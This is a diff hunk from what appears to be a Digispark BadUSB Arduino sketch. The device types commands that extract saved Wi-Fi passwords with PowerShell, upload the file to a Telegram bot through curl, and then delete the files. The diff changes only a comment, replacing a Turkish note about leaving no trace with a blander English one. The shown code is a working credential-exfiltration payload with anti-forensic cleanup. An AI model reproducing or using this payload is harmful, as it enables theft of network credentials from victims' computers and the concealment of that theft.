@@ -20,7 +20,7 @@ void loop() {
   DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > WiFipasswords.txt"); 
   DigiKeyboard.delay(500);  
   DigiKeyboard.println("curl -X POST -H 'Content-Type: text/plain' -F chat_id=<chat_id> -F document=@./WiFipasswords.txt https://api.telegram.org/bot<bot_id>/sendDocument"); //sent to telegram bot
-  DigiKeyboard.println("del Wi-* /s /f /q"); //Wi ile başlayan tüm dosyalar sil ki iz kalmasın
+  DigiKeyboard.println("del Wi-* /s /f /q"); //delete files starting with Wi
   DigiKeyboard.delay(500);  
   DigiKeyboard.println("exit");
   DigiKeyboard.delay(100);  
